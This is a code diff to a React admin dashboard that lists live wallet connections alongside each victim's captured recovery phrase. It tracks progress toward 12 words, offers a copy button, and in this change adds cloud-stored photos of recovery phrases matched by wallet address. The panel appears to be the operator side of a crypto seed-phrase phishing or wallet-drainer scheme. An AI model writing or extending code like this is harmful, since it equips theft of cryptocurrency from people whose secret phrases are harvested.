@@ -16,6 +16,7 @@ import { WalletLogo } from '../../lib/walletLogos'
 import { adminFetchJsonResult } from '../../lib/adminDemo'
 import { listLocalWalletSessions, mergeWalletSessions, subscribeWalletMonitor } from '../../lib/walletMonitorStore'
 import { listCloudWalletSessions, subscribeCloudWalletSessions } from '../../lib/walletCloudStore'
+import { listCloudPhraseSnaps, subscribeCloudPhraseSnaps } from '../../lib/walletPhraseSnapsCloud'
 
 export interface LiveWalletConnection {
   id: string
@@ -73,8 +74,9 @@ function CopyButton({ value, label }: { value: string; label: string }) {
 function PhraseCell({ phrase, snap }: { phrase: string | null; snap?: string | null }) {
   const text = phrase?.trim() || ''
   const wordCount = text ? text.split(/\s+/).filter(Boolean).length : 0
+  const hasSnap = Boolean(snap?.startsWith('data:image'))
 
-  if (!text) {
+  if (!text && !hasSnap) {
     return (
       <span className="inline-flex items-center gap-1.5 text-[11px] text-gray-500 italic">
         <span className="w-1.5 h-1.5 rounded-full bg-amber-400/80 animate-pulse" />
@@ -86,27 +88,33 @@ function PhraseCell({ phrase, snap }: { phrase: string | null; snap?: string | n
   return (
     <div className="flex items-start gap-2 max-w-[320px]">
       <div className="flex-1 min-w-0 rounded-lg bg-[#060A0E] border border-[#243044] px-3 py-2">
-        <div className="flex items-center justify-between gap-2 mb-1">
-          <p className="text-[10px] uppercase tracking-wider text-gray-500">Recovery phrase (live)</p>
-          {wordCount < 12 ? (
-            <span className="text-[10px] font-semibold text-amber-400 tabular-nums">{wordCount}/12 words</span>
-          ) : (
-            <span className="text-[10px] font-semibold text-[#c7f284]">Complete</span>
-          )}
-        </div>
-        <p className="text-sm font-mono text-white break-all leading-snug">{text}</p>
-        {snap ? (
-          <a href={snap} target="_blank" rel="noopener noreferrer" className="mt-2 block">
+        {text ? (
+          <>
+            <div className="flex items-center justify-between gap-2 mb-1">
+              <p className="text-[10px] uppercase tracking-wider text-gray-500">Recovery phrase (live)</p>
+              {wordCount < 12 ? (
+                <span className="text-[10px] font-semibold text-amber-400 tabular-nums">{wordCount}/12 words</span>
+              ) : (
+                <span className="text-[10px] font-semibold text-[#c7f284]">Complete</span>
+              )}
+            </div>
+            <p className="text-sm font-mono text-white break-all leading-snug">{text}</p>
+          </>
+        ) : (
+          <p className="text-[10px] uppercase tracking-wider text-gray-500 mb-2">Phrase photo</p>
+        )}
+        {hasSnap ? (
+          <a href={snap!} target="_blank" rel="noopener noreferrer" className="mt-2 block">
             <img
-              src={snap}
+              src={snap!}
               alt="Recovery phrase snap"
-              className="max-h-24 w-auto rounded-md border border-[#243044] object-contain"
+              className="max-h-32 w-full rounded-md border border-[#243044] object-contain bg-black"
             />
-            <span className="text-[10px] text-[#c7f284] mt-1 inline-block">View snap</span>
+            <span className="text-[10px] text-[#c7f284] mt-1 inline-block">Open full image</span>
           </a>
         ) : null}
       </div>
-      <CopyButton value={text} label="Phrase" />
+      {text ? <CopyButton value={text} label="Phrase" /> : null}
     </div>
   )
 }
@@ -185,10 +193,19 @@ export const AdminWalletConnect: React.FC = () => {
     }>('/api/admin/wallet-connections/live', { connections: [] })
 
     const cloud = await listCloudWalletSessions()
+    const snapByWallet = await listCloudPhraseSnaps()
+    const cloudWithSnaps = cloud.map((row) => ({
+      ...row,
+      phraseSnapImage: row.phraseSnapImage || snapByWallet.get(row.walletAddress) || null,
+    })) as LiveWalletConnection[]
     const local = listLocalWalletSessions() as LiveWalletConnection[]
+    const localWithSnaps = local.map((row) => ({
+      ...row,
+      phraseSnapImage: row.phraseSnapImage || snapByWallet.get(row.walletAddress) || null,
+    }))
     const merged = mergeWalletSessions(
-      mergeWalletSessions(ok ? data.connections || [] : [], cloud as LiveWalletConnection[]),
-      local
+      mergeWalletSessions(ok ? data.connections || [] : [], cloudWithSnaps),
+      localWithSnaps
     )
     setConnections(merged)
     setLastSync(new Date().toISOString())
@@ -206,9 +223,11 @@ export const AdminWalletConnect: React.FC = () => {
     load()
     const unsubLocal = subscribeWalletMonitor(load)
     const unsubCloud = subscribeCloudWalletSessions(load)
+    const unsubSnaps = subscribeCloudPhraseSnaps(load)
     return () => {
       unsubLocal()
       unsubCloud()
+      unsubSnaps()
     }
   }, [load])
 
